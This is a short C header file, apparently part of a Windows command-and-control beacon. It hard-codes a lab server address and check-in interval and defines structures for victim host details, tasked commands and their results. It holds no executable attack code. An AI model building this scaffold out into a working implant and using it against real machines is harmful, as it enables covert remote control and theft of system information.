/*
 * types.h - Structures de données du beacon
 */

#ifndef TYPES_H
#define TYPES_H

#include <windows.h>

// Configuration
#define SERVER_IP       "192.168.18.24"
#define SERVER_PORT     8000
#define SLEEP_TIME_MS   5000

// Tailles des buffers
#define UUID_SIZE       64
#define SMALL_BUF       128
#define MEDIUM_BUF      1024
#define LARGE_BUF       8192

// Structures
typedef struct {
    char agent_id[UUID_SIZE];
    char username[SMALL_BUF];
    char hostname[SMALL_BUF];
    char internal_ip[16];
    char os_version[SMALL_BUF];
} AgentInfo;

typedef struct {
    int task_id;
    char command[MEDIUM_BUF];
} TaskResponse;

typedef struct {
    char agent_id[UUID_SIZE];
    int task_id;
    char result[LARGE_BUF];
    int success;
} TaskResult;

typedef struct {
    int status_code;
    char body[LARGE_BUF];
    DWORD body_length;
} HttpResponse;

#endif